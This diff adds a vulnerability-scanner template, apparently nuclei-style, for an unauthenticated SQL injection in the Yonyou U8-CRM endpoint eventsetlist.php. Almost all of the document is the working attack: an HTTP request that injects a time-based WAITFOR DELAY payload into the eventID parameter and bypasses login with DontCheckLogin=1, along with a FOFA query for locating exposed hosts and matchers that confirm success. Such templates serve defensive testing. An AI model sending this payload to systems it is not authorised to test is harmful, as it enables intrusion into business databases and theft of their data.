@@ -1,0 +1,28 @@
+## id: VEID-2025-0119
+## name: 用友U8-CRM系统接口eventseteventsetlist.php存在SQL注入
+## author: hack007x
+## severity: critical
+## tags: veid,sql,veid2025
+## description: 用友U8-CRM系统接口eventseteventsetlist.php存在SQL注入，未经身份验证的攻击者通过漏洞执行任意SQL语句。
+## fofa-query: body="用友U8CRM" || body="/js/tfunction.js" || title="用友U8CRM"
+## verification: true
+
+
+GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:10'-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: PHPSESSID=bgsesstimeout-;
+
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time > 10
+#@ matcher: header["Content-Type"] contains "html" 
+#@ matcher: body contains "Database" || body contains "Microsoft"
+
+
+
+
+
+
+# @VEIL-STAMP: dc696a6a5b9961537cd3614566ea5be1d8df40e73df71cd62c18a4fdf93cb9eb
